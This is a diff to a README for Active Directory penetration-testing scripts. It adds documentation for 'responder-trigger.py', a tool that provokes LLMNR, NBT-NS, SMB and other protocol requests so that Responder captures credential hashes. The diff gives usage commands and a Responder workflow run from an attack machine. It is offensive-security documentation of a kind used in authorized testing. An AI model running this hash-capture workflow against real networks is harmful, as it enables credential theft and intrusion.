@@ -9,6 +9,7 @@ A collection of automated enumeration tools for Active Directory penetration tes
 | `nxc_auto.py` | Multi-protocol scanner using NetExec |
 | `ldap-deep.py` | Deep LDAP enumeration with ldapsearch/Impacket |
 | `smb-deep.py` | Comprehensive SMB enumeration |
+| `responder-trigger.py` | Protocol hash capture provocateur for Responder |
 
 ---
 
@@ -75,7 +76,72 @@ Generates `nxc_report_<IP>.md` with all command outputs.
 
 ---
 
-## 2. ldap-deep.py
+## 2. responder-trigger.py
+
+**Protocol Hash Capture Provocateur** - Sends fake solicitations to trigger Responder hash capture.
+
+### Features
+
+- Triggers 13+ protocols that Responder can intercept
+- Broadcast/multicast protocols (LLMNR, NBT-NS, mDNS)
+- TCP protocols (SMB, HTTP, LDAP, MSSQL, FTP, SMTP, POP3, IMAP)
+- Continuous loop mode for persistent triggering
+- Pure Python, no dependencies required
+
+### Usage
+
+```bash
+# Trigger all protocols against Responder IP
+./responder-trigger.py 192.168.1.100
+
+# Only broadcast protocols (no target needed)
+./responder-trigger.py --broadcast
+
+# Specific protocols only
+./responder-trigger.py 192.168.1.100 --protocols llmnr nbtns smb
+
+# Multiple iterations
+./responder-trigger.py 192.168.1.100 --count 5
+
+# Continuous mode (loop forever)
+./responder-trigger.py 192.168.1.100 --loop --delay 10
+```
+
+### Supported Protocols
+
+| Protocol | Port | Type | Description |
+|----------|------|------|-------------|
+| **LLMNR** | UDP 5355 | Multicast | Link-Local Multicast Name Resolution |
+| **NBT-NS** | UDP 137 | Broadcast | NetBIOS Name Service |
+| **mDNS** | UDP 5353 | Multicast | Multicast DNS |
+| **SMB** | TCP 445 | Unicast | SMB/CIFS Connection |
+| **HTTP** | TCP 80 | Unicast | HTTP/WPAD Requests |
+| **HTTPS** | TCP 443 | Unicast | HTTPS Requests |
+| **WebDAV** | TCP 80 | Unicast | WebDAV PROPFIND |
+| **LDAP** | TCP 389 | Unicast | LDAP Bind Request |
+| **MSSQL** | TCP 1433 | Unicast | MS-SQL Pre-login |
+| **FTP** | TCP 21 | Unicast | FTP Connection |
+| **SMTP** | TCP 25 | Unicast | SMTP Connection |
+| **POP3** | TCP 110 | Unicast | POP3 Connection |
+| **IMAP** | TCP 143 | Unicast | IMAP Connection |
+
+### Typical Workflow
+
+1. Start Responder on your attack machine:
+   ```bash
+   sudo responder -I eth0 -wrf
+   ```
+
+2. Run responder-trigger from victim network (or simulate):
+   ```bash
+   ./responder-trigger.py <responder_ip> --loop
+   ```
+
+3. Captured hashes appear in Responder output and logs.
+
+---
+
+## 3. ldap-deep.py
 
 **Comprehensive LDAP enumeration** - Deep dive into Active Directory via LDAP queries.
 
@@ -124,7 +190,7 @@ Generates `ldap_deep_<domain>.md` with all query results.
 
 ---
 
-## 3. smb-deep.py
+## 4. smb-deep.py
 
 **Comprehensive SMB enumeration** - Deep SMB/RPC enumeration with multiple tools.
 
